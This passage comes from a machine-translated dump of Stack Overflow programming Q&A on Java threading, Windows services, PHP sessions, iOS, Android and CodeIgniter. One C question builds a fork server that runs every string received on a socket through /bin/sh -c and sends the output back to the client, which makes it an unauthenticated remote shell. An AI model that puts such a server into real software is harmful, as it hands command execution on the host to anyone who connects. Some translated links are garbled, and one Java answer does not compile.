   height: 'auto',
   caption: "Test Grid"
});

jQuery("#list").jqGrid('filterToolbar', { stringResult: true, searchOnEnter: false, defaultSearch: "cn" });

<table id="list"></table>
<div id="pager"></div> 
```

# java - 如何在后台线程中启动服务器并知道服务器在启动时没有抛出异常？

> ID：15159453
> 
> 赞同：0
> 
> 时间：2013-03-01T13:56:05.467
> 
> 标签：java, multithreading, oop, concurrency

我有一个封装了服务器套接字的类，即服务器功能。
该类的接口是：

```
class Server{  
  public void start();  
  public void stop();  
} 
```

开始如下：

```
public void start(){  
   ExecutorService tp = Executors.newSingleThreadExecutor();  
   while(!stop){  
    try {  
        Socket clientConnection = serverSocket.accept();  
        tp.execute(new ClientProcessor(clientConnection));                
    } catch (IOException e) {  
            stop = true;
    }  
   } 
```

我很难弄清楚如何在不阻止我的`main`.
我的意思是我需要从后台线程启动服务器，所以我想到了以下几点：

```
ExecutorService tp2 = Executors.newSingleThreadExecutor();  
 tp.submit(new Runnable(){  
     public void run(){  
    Server s = new Server();
        s.start();  
     }  
 });  
} 
```

但我想知道服务器启动并且没有抛出异常。我怎样才能做到这一点？
即我如何从我的`main`线程中知道后台服务器启动正常，所以我可以继续进行其余操作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T15:24:33.813

启动服务器。稍等一会。尝试在本地堆栈上连接到它。如果连接成功，您就有了赢家 - 只需关闭临时连接。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:09:24.997

一个简单的方法是收集一个集合中的所有异常，并在某个时间点将它们返回到前台线程。

```
class Server{  
    private Collection<? extends Exception> exceptions = new ArrayList<Exception>();

    public void start()
    {
      try{ /* do something*/ }
      catch(Exception e)
      {
          exceptions.add(e)
      }
    }

    public void stop();

    public Collection<Exception> getAllExceptions()
    {
        return exceptions;
    }

    public boolean checkOk()
    {
        return 0 == exceptions.size();
    }    

} 
```

* * *

关于如何在线程之间传输数据的详细说明：

如果你声明你的服务器类似于我上面的建议，那么我们可以更改你用来生成服务器的代码来传输`serverStartupOk`信息：

```
ExecutorService tp2 = Executors.newSingleThreadExecutor();  
final boolean[] result = new boolean[1]; //Final object so it can pass between threads
 tp.submit(new Runnable(){  
     public void run(){  
    Server s = new Server();
        s.start();  
        result[0] = s.checkOk(); // Retrieve the check from the server, store it in 
                                 // final array variable
     }  
 });

boolean serverStartupOk = result[0];
System.out.println("Server startup succesful: " + Boolean(serverStartupOk).toString());
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T14:14:06.750

这是一个*非常*简单的示例（尽管有许多更好且更复杂的方法）：

```
interface Server implements Thread{
    public void startup();
    public void shutdown();
}

class MyServer implements Server{
    private Exception serverError=null;
    ExecutorService singleThreadManager;

    public Exception getServerError(){
        return serverError;
    }

    public void run(){    
       while(!stop){  
            try {  
                 Socket clientConnection = serverSocket.accept();  
                 singleThreadManager.execute(new ClientProcessor(clientConnection));               
            } catch (IOException e) { 
                 serverError = e;
                 // stop = true;
                 shutdown(); // shutdown cleanly after exception
            }
       } 
    } 

    public void startup(){
       singleThreadManager = Executors.newSingleThreadExecutor();
        // do setup tasks and then
        start(); // thread.run() will now be called asynchronously
    }
}

public static void main (String ... args){
    MyServer s = new MyServer();
    s.startup();
    // whenever you want you can now call
    Exception x = s.getServerError();
    // to see whether the server has shutdown because of an error.
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T14:19:37.583

也许你可以在你的主应用程序中实现一个事件处理程序。您的主应用程序应注册为服务器类的事件监听器。

请查看以下链接，它向您展示了 C# 的事件处理示例和 Java 的相同示例

[http://scatteredcode.wordpress.com/2011/11/24/from-c-to-java-events/](http://scatteredcode.wordpress.com/2011/11/24/from-c-to-java-events/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T15:05:44.753

使用你自己的`ThreadPoolExecutor`而不是`Executors`. 然后覆盖`afterExecute`TPE 提供的钩子，对异常做任何你想做的事情。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-03T09:37:40.280

我在这里的字里行间读了一点，但看起来您想知道套接字上的初始侦听是否成功。如果您想等待并查看是否有任何客户端失败，则无需在不同的线程中运行它。

如果这是正确的，那么您可以在启动线程以处理客户端连接之前捕获初始 TCP 服务器套接字实例化发出的任何异常。将服务器传递给新线程，而不是在新线程中创建它。

# c# - 我是否需要在 OnStop 方法中终止 Windows 服务中的任务？

> ID：15159457
> 
> 赞同：1
> 
> 时间：2013-03-01T13:56:37.417
> 
> 标签：c#, windows-services, task-parallel-library

所以我有一个 Windows 服务并且我在 OnStart 中开始了任务

```
 partial class AppServices : ServiceBase
    {
        private static readonly ILog Log = LogManager.GetCurrentClassLogger();
        private Task _task;

        public AppServices()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            Log.Info("Service started");

            _task = Task.Factory.StartNew(StartWork, TaskCreationOptions.LongRunning);
        }

        protected override void OnStop()
        {
            Log.Info("Service stopped");
        }

        private void StartWork()
        {
           while(true)
           {
               // grab some data from db or services
           }
       } 
```

我是否需要在 OnStop 中添加 CancellationToken 并停止 Task 还是没有必要？因为服务何时停止 - 任务也会停止。它是否安全？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-01T14:05:06.083

你正以每小时 130 公里的速度在高速公路上行驶。突然你看到一个警察告诉你停下来。当您注意到他时，您就处于 A 点。您可以：

1.  无视他的命令
2.  立即停止（在 A 点）改变车道并在大爆炸中坠毁。
3.  逐渐但安全地停车，降低车速，并最终在 B 点达到 0 公里/小时。B 点尽可能靠近 A 点，但在不危及任何人的情况下尽可能靠近。

在现实生活中，任何人都会选择 3)。在 .NET 中，根据应用程序的性质和重要性，您也可以选择 1) 或 2)。

这取决于您是否愿意冒险：

1.  被警察追捕（被任务管理器杀死）
2.  崩溃（丢失重要数据或导致不一致等等）
3.  绝对没有

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-01T14:07:16.920

任务作为[后台线程](http://msdn.microsoft.com/en-us/library/h339syd0.aspx)运行。因此，当服务停止时，任务将自动停止。是否需要正式取消任务取决于任务是否需要知道它正在退出以便它可以执行任何必要的清理。

# php - 会话保存在 php 中延迟

> ID：15159460
> 
> 赞同：0
> 
> 时间：2013-03-01T13:56:42.120
> 
> 标签：php, ajax, session

我有以下问题：我有两页。在第一页是一个按钮。单击该按钮时，将向页面发出 ajax 请求，该页面将数据保存到会话中。然后，它会将我重定向到显示此保存数据的第二页。问题是，当我转到第二页时，没有显示数据，但是当我刷新页面时，会显示数据。如何重定向到存储会话数据的第二页？

例子：

刷新前：

![刷新前](../Images/7fbd4b5323615712ab65e78118572c7a.png)

后：

![后](../Images/48a9291415b5470c2910ef19cc433d36.png)

有没有人有任何想法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:00:08.180

在转发到下一页之前，您应该等待 AJAX 请求的响应。

最好使用回调方法重定向到下一页。

如果您发布一些代码可能会更容易指出。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:02:49.010

试试这个，如果你使用 jQuery，希望它会起作用，然后很好，使用 e.preventDefault(); 并在获得 ajax 响应后重定向您的下一页。

# database - Eclipse无法连接数据库

> ID：15159461
> 
> 赞同：0
> 
> 时间：2013-03-01T13:56:43.357
> 
> 标签：database, linux, eclipse

是否可以在 linux/ubuntu 上使用小型数据库构建桌面应用程序？我试过eclipse+derby-不工作，驱动程序加载，但无法连接到数据库。Eclipse +sqlite- 也不起作用，没有合适的驱动程序。从现在开始的一周内，我尝试但无法连接到我的数据库。如果 some1 有工作教程如何在 ubuntu+eclipse 中执行此操作，请分享。1 周谷歌，所以请如果有人通过这个来帮助我。

现在我使用 SQLite，我已经在构建路径中加载了 sqlitejdbc-v051.jar 并使用

```
Class.forName("org.sqlite.JDBC").newInstance(); 
```

但结果是：没有为 jdbc:derby:/home/vasil/MYDB 找到合适的驱动程序

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:00:31.933

你看过[这个网站](http://db.apache.org/derby/integrate/plugin_help/start_toc.html)吗？这似乎是一个相当不错的演练。您尝试连接的数据库服务器是否正在运行并且您的应用程序是否可以访问？

看看[这个问题](https://stackoverflow.com/questions/3816015/sqlexception-no-suitable-driver-found-for-jdbcderby-localhost1527)。它似乎与您的非常相似。我没有使用过 derby，但我使用过许多其他数据库服务器。听起来您的应用程序类路径中没有驱动程序。

此外，[本教程](http://docs.oracle.com/javase/tutorial/jdbc/basics/connecting.html)也可能会有所帮助。它展示了如何使用 jdbc 连接到数据库。

# iphone - UIButton 在没有明显原因的情况下调整大小？

> ID：15159463
> 
> 赞同：1
> 
> 时间：2013-03-01T13:56:47.607
> 
> 标签：iphone, ios, objective-c, cocoa-touch, uibutton

我有 ViewController(1) 的层次结构是这样的

```
ViewController
- UIView
-- UITableView (height 80% of it's superview)
-- UIButton ( height 20% of it's superview, 80% offset y) 
```

按下 UIButton 后，新的 ViewController 被推送。到现在一切都还好，但在动画的那一刻，我看到 UIButton 被调整大小以适应整个视图。现在回去后，我在整个视图上都有我的按钮。

什么会导致出现此问题？

1.

```
UIPopOverController
- UINavigationController
-- UIViewController 
```

编辑1：

```
- (void)viewDidAppear:(BOOL)animated
{
    // ... 
    _storeButton = [[UIButton alloc] initWithFrame:frame];
    _storeButton.adjustsImageWhenHighlighted = NO;
    _storeButton.backgroundColor = [UIColor colorWithHexString:(_productData.count > 0) ? @"0x8BC53F" : @"0xA4A4A4" ];
    [_storeButton addTarget:self action:@selector(storeButtonTouched:) forControlEvents:UIControlEventTouchUpInside];

    // ...
}

#pragma mark - Store request.
- (void)storeButtonTouched:(id)sender
{
    DLog(@"_storeButton: %@", _storeButton);

    if ( _productData != nil && _productData.count > 0) {
        _productData = [NSArray arrayWithArray:_iapManager.productData];

        TTIAPTableViewController *iapVC = [[TTIAPTableViewController alloc] initWithStyle:UITableViewStylePlain];
        iapVC.entries = _productData;
        iapVC.contentSizeForViewInPopover = self.view.frame.size;

        [self.navigationController pushViewController:iapVC animated:YES];
        [iapVC release];

    } else {
        DLog(@"No products available.");
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T12:01:30.010

通过使用[包含 ViewControllers](http://www.cocoanetics.com/2012/04/containing-viewcontrollers/)解决。

# java - 有没有办法在锁定屏幕上启动活动？

> ID：15159466
> 
> 赞同：1
> 
> 时间：2013-03-01T13:57:02.877
> 
> 标签：java, android

我需要在锁定屏幕上开始活动。它可以是锁定屏幕上的小活动或全新的锁定屏幕。它必须以单击锁定按钮开始

这个怎么做？我已经有活动、广播接收器和服务来完成所有工作，但不知道如何将活动放在锁定屏幕上。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:01:42.610

在您的 Activity 中`onCreate()`，在调用之前`setContentView()`，添加以下内容：

```
getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED); 
```

对于您可以设置的所有窗口标志，请参阅[`documentation`](http://developer.android.com/reference/android/view/WindowManager.LayoutParams.html)

# c - 用于 exec 的分叉服务器和孙子

> ID：15159468
> 
> 赞同：0
> 
> 时间：2013-03-01T13:57:21.270
> 
> 标签：c, exec, fork

我需要关于 fork-server 的帮助。我想要做的是接受一个客户端然后分叉让其他客户端连接，同时将标准输出和错误重定向到客户端。然后客户端应该能够发送应该由位于孙子中的 execlp() 执行的字符串。

我无法找到我的逻辑错误..

在 main() 中：

```
 while (1) {

        t = sizeof(remote);

        printf("Waiting for connection.\n");

        s2 = accept(s, (struct sockaddr*)&remote, &t);

        if (s2 == -1) {
            perror("accept");
            exit(1);
        } else {

            printf("Client connected.\n");

            if(!fork()) {

                close(1);
                dup(s2);
                handle(s2);
                exit(0);               
            }
            close(s2);
        }
    } 
```

在句柄（）中：

```
 char str[100];
    int n;

    while(1) {

        n = recv(client_socket, str, 100, 0);

        if(n <= 0) {

            perror("recv");
            exit(1);
        } else {

            if(!fork()) {

                execlp("/bin/sh", "sh","­-c", str, NULL);
                exit(1);
            } 
            wait(0);
        } 
    } 
```

execlp 的结果未重定向到客户端并给出错误“sh: Can't open c”。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:01:26.180

你应该写：`execlp("/bin/sh", "sh","-c", str, NULL);`将选项'-c'传递给shell。您传递的选项`"c"`被解释为：运行`c`不存在的名为的脚本。

见：[http ://unixhelp.ed.ac.uk/CGI/man-cgi?sh](http://unixhelp.ed.ac.uk/CGI/man-cgi?sh)

另一件事：您应该在读取字符串后 NUL 终止您的字符串：

```
if(n > 0)
    str[n] = '\0'; 
```

您还应该只读取 99 个字符，因为您将`'\0'`在字符串末尾写入字符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:14:47.670

一个可能的原因是您尝试运行的命令不在命令搜索路径中。

另一个原因可能是您获取的字符串包含命令*及其*参数，并且将其作为单个参数`execlp`传递给它将作为单个参数传递给 shell，因此它认为整个字符串就是命令。

如果它是最后一个，那么您需要将命令及其参数拆分为一个`argv`类似的数组，然后使用`execvp`。

正确终止字符串也很重要。连接客户端是否使用终止`'\0'`字符发送？如果没有，那么您需要自己添加（在这种情况下，您只能接收 99 个字符）。

# javascript - 如何从在 iOS 中保存为应用程序的页面打开新页面？

> ID：15159485
> 
> 赞同：0
> 
> 时间：2013-03-01T13:58:11.813
> 
> 标签：javascript, html, ios, mobile-safari

我正在开发一个 HTML5 应用程序，它应该能够在许多不同的环境中运行——大多数桌面网络浏览器、移动网络浏览器，以及作为保存到 iOS 设备的应用程序。

问题是它使用 target="_blank" 打开多个单独的页面，主要用于导出或打印数据，这在 iOS Web 应用程序中会吹走当前窗口并使用户无法返回。一个简单的返回链接不是解决方案，因为主页中的状态比可以合理传递的要多。iOS 移动应用程序有没有办法在移动 Safari 中将其页面作为新标签打开？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:21:31.667

如果您正在谈论将 Web 应用程序添加到主屏幕并以独立模式运行它，请使用：

```
<meta name="apple-mobile-web-app-capable" content="yes" /> 
```

那么答案是否定的，很遗憾。我刚刚完成了需要像这样工作的项目，在新“选项卡”中打开链接的唯一方法是使用 HTML/CSS/JS 创建自己的选项卡并在 iframe 中打开这些链接。

您还需要注意**X-Frame-Options: Deny**阻止网站在 iframe 中加载。例如 google、facebook... 不能再在 iframe 中打开，因为他们想[保护自己免受**Clickjacking**](http://msdn.microsoft.com/en-us/library/cc288472%28v=vs.85%29.aspx#_replace)的侵害。

最后，我最终使我的应用程序 100% 基于 javascript，并在 index.html 页面上完成了所有操作。当我需要来自服务器端的东西时，我还做了一些 AJAX 请求……而且效果很好。

如果您使用的是 JQuery，请参阅：[通过 ajax 处理导出材料的下载](http://johnculviner.com/post/2012/03/22/Ajax-like-feature-rich-file-downloads-with-jQuery-File-Download.aspx)。

# macos - 清除 CGContextRef 中的当前路径？

> ID：15159486
> 
> 赞同：3
> 
> 时间：2013-03-01T13:58:19.817
> 
> 标签：macos, cocoa, quartz-graphics

我正在寻找清除当前路径的方法`CGContextRef`？`CGContextRef`我想用 new替换当前路径`CGPathRef`。

我以为我可以`CGContextReplacePathWithStrokedPath`吗？但为此，我也必须清除存储在`CGContextRef`.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T14:10:54.010

[CGContextBeginPath](https://developer.apple.com/library/mac/documentation/graphicsimaging/reference/CGContext/Reference/reference.html#//apple_ref/c/func/CGContextBeginPath)清除当前路径：

> 一个图形上下文在任何时候都只能有一个使用的路径。如果调用此函数时指定的上下文已经包含当前路径，Quartz 会丢弃旧路径以及与之关联的任何数据。

# codeigniter - 如何在codeigniter中使用重新路由？

> ID：15159490
> 
> 赞同：0
> 
> 时间：2013-03-01T13:58:28.007
> 
> 标签：codeigniter, codeigniter-2

例如，我有 URI `/index.php/system/index/page/5`，是否可以重新路由它看起来像`index.php/page/5`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:08:26.300

是的，您可以在 application/config/routes.php 中执行此操作。你会做

```
$route['page/5'] = "system/index/page/5"; 
```

如果您要多次使用相同的 url 结构，例如

```
/index.php/system/index/page/1
/index.php/system/index/page/2
/index.php/system/index/page/3 
```

然后你可以做

```
$route['page/(:num)'] = "system/index/page/$1"; 
```

# android - 如何在你自己的安卓主屏幕上创建一个小部件？

> ID：15159492
> 
> 赞同：0
> 
> 时间：2013-03-01T13:58:36.810
> 
> 标签：android, homescreen

如何在我们自己的家庭应用程序上创建小部件。这样用户可以在按下按钮时获取所有用户安装的小部件，并在按下后退按钮时将其删除

# ios - 当 UIViewControllers 需要被销毁时我应该如何整理它们

> ID：15159493
> 
> 赞同：2
> 
> 时间：2013-03-01T13:58:41.157
> 
> 标签：ios, objective-c, ios5

我开始编写我们的 iPhone 应用程序的第二个版本，我正在尝试整理以前的错误（因为这是我第一次尝试 Objective-C）。我的问题与“当 UIViewController 被销毁时我需要做的事情”有关，那里似乎有一些相互矛盾的答案，我想确保我理解正确。

几个约束：

1.  此代码适用于 iOS 5 和 iOS 6 设备
2.  我不希望在 viewWillAppear 和 viewWillDisappear 上注册和取消注册 NSNotifications，因为 UIViewControllers 需要接收通知，即使它们不能被用户看到。
3.  我使用的是 StoryBoard 而不是单独的 nib 文件。

那么考虑到上述限制，以下陈述是否正确？

1.  将情节提要连接到 UIViewControllers 的 IBOutlets 应该是弱的，强引用将在幕后创建。
2.  因为 IBOutlets 很弱，所以我不需要在内存不足的情况下将它们归零
3.  我不应该使用 viewDidUnload，因为它已被弃用，我应该使用 didReceiveMemoryWarning。在这种情况下，我只需要消除强属性（可以重新计算）
4.  在 viewDidLoad 上注册 NSNotifications 是可以接受的。
5.  因为我希望在隐藏视图时继续接收通知，所以取消注册它们的最佳位置是在 dealloc 中，在 didReceiveMemoryWarning 中也取消注册它们没有任何好处。

谢谢你的帮助，

担

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T14:26:46.973

> 将情节提要连接到 UIViewControllers 的 IBOutlets 应该是弱的，强引用将在幕后创建。

不会。NSKeyedUnarchiver (NSCoder) 不会*更改*与用户创建的 outlet 关联的存储限定符。你让它们保持弱，因为你从来没有显式地分配和初始化 IBOutlets，因此你没有“拥有”它们在这个词的可可意义上。

> 因为 IBOutlets 很弱，所以我不需要在内存不足的情况下将它们归零

一点也不真实。将弱引用归零在 dealloc 中归零，而不是在内存不足的情况下。Apple 希望您通过明确发布强大的插座来处理内存警告来做到这一点。

> 我不应该使用 viewDidUnload，因为它已被弃用，我应该使用 didReceiveMemoryWarning。在这种情况下，我只需要消除强属性（可以重新计算）

是的，但至于 -viewDidUnload 的替换，dealloc 就是为了这个目的。

> 在 viewDidLoad 上注册 NSNotifications 是可以接受的。因为我希望在隐藏视图时继续接收通知，所以取消注册它们的最佳位置是在 dealloc 中，在 didReceiveMemoryWarning 中也取消注册它们没有任何好处。

绝对地。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T14:35:41.763

我相信你说的是对的。关于 IBOutlets 和强/弱引用，请参阅[此线程](https://stackoverflow.com/questions/7678469/should-iboutlets-be-strong-or-weak-under-arc)。

至于通知：在 didReceiveMemoryWarning 中注销它们似乎毫无意义，因为它们本身不会在注销时释放任何内存。因此，您在解除分配时取消注册它们是正确的。

# android - Sherlock 操作栏和滑动菜单

> ID：15159494
> 
> 赞同：2
> 
> 时间：2013-03-01T13:58:42.920
> 
> 标签：android, actionbarsherlock, slidingmenu

在我的应用程序中，我只想使用滑动菜单，而我应该使用的操作栏是 Sherlock 操作栏。

我下载了两个库。[滑动菜单](http://actionbarsherlock.com/)

[1](http://actionbarsherlock.com/)：[https](https://github.com/jfeinstein10/SlidingMenu) ://github.com/jfeinstein10/SlidingMenu和[Sherlock 操作栏](http://actionbarsherlock.com/)

我可以分别使用这两个库。我需要在我的应用程序中一起使用。所以搜索后我发现我必须这样做

**添加 ActionBarSherlock 作为对 SlidingMenu 的依赖项进入我计划使用的 SlidingActivity，使它们扩展 Sherlock__Activity 而不是 __Activity。**

当我将 SAB 作为依赖项添加到滑动菜单时，我在 eclipse 中遇到了这样的错误。

```
Found 2 versions of android-support-v4.jar in the dependency list,
but not all the versions are identical (check is based on SHA-1 only at this time).
All versions of the libraries must be the same at this time.
Versions found are:
Path: C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc        \JakeWharton-ActionBarSherlock-e5c2d1c\library\libs\android-support-v4.jar
Length: 271754
SHA-1: 53307dc2bd2b69fd5533458ee11885f55807de4b
Path: C:\Users\Kamalone\Downloads\SlidingMenu-master\SlidingMenu-master\library    \libs\android-support-v4.jar
Length: 385685
SHA-1: 48c94ae70fa65718b382098237806a5909bb096e 
```

罐子不匹配！修复你的依赖

那么我该怎么做呢？

从 sherlockAB 中删除 lib 文件后，我收到类似这样的手动错误

```
C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:6: error: Error retrieving parent for item: No resource found that matches the given name 'android:Widget.Holo.ActionBar.Solid'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:10: error: Error retrieving parent for item: No resource found that matches the given name 'android:Widget.Holo.Light.ActionBar.Solid'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:12: error: Error retrieving parent for item: No resource found that matches the given name 'android:Widget.Holo.Light.ActionBar.Solid.Inverse'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:15: error: Error retrieving parent for item: No resource found that matches the given name 'android:Widget.Holo.ActionBar.TabView'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:17: error: Error retrieving parent for item: No resource found that matches the given name 'android:Widget.Holo.Light.ActionBar.TabView'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:19: error: Error retrieving parent for item: No resource found that matches the given name 'android:Widget.Holo.Light.ActionBar.TabView.Inverse'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:22: error: Error retrieving parent for item: No resource found that matches the given name 'android:Widget.Holo.ActionBar.TabBar'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:24: error: Error retrieving parent for item: No resource found that matches the given name 'android:Widget.Holo.Light.ActionBar.TabBar'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:26: error: Error retrieving parent for item: No resource found that matches the given name 'android:Widget.Holo.Light.ActionBar.TabBar.Inverse'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values\abs__styles.xml:101: error: Error: No resource found that matches the given name: attr 'android:textAllCaps'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:29: error: Error retrieving parent for item: No resource found that matches the given name 'android:Widget.Holo.ActionBar.TabText'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:31: error: Error retrieving parent for item: No resource found that matches the given name 'android:Widget.Holo.Light.ActionBar.TabText'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:33: error: Error retrieving parent for item: No resource found that matches the given name 'android:Widget.Holo.Light.ActionBar.TabText.Inverse'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:55: error: Error retrieving parent for item: No resource found that matches the given name 'android:Widget.Holo.Light.ActionMode.Inverse'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values\abs__styles.xml:328: error: Error: No resource found that matches the given name: attr 'android:textAllCaps'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:93: error: Error retrieving parent for item: No resource found that matches the given name 'android:TextAppearance.Holo.Widget.ActionBar.Menu'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:96: error: Error retrieving parent for item: No resource found that matches the given name 'android:TextAppearance.Holo.Widget.ActionBar.Title'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:98: error: Error retrieving parent for item: No resource found that matches the given name 'android:TextAppearance.Holo.Widget.ActionBar.Title.Inverse'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:100: error: Error retrieving parent for item: No resource found that matches the given name 'android:TextAppearance.Holo.Widget.ActionBar.Subtitle'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:102: error: Error retrieving parent for item: No resource found that matches the given name 'android:TextAppearance.Holo.Widget.ActionBar.Subtitle.Inverse'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:104: error: Error retrieving parent for item: No resource found that matches the given name 'android:TextAppearance.Holo.Widget.ActionMode.Title'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:106: error: Error retrieving parent for item: No resource found that matches the given name 'android:TextAppearance.Holo.Widget.ActionMode.Title.Inverse'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:108: error: Error retrieving parent for item: No resource found that matches the given name 'android:TextAppearance.Holo.Widget.ActionMode.Subtitle'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:110: error: Error retrieving parent for item: No resource found that matches the given name 'android:TextAppearance.Holo.Widget.ActionMode.Subtitle.Inverse'.
[2013-03-01 14:18:14 - SlidingMenuLibrary] C:\Users\Kamalone\Downloads\JakeWharton-ActionBarSherlock-4.2.0-0-g90939dc\JakeWharton-ActionBarSherlock-e5c2d1c\library\res\values-v14\abs__styles.xml:113: error: Error retrieving parent for item: No resource found that matches the given name 'android:TextAppearance.Holo.Widget.PopupMenu'. 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T16:00:30.550

这里的第一个问题是他们使用了不同版本的支持库（android-support-v4.jars）。

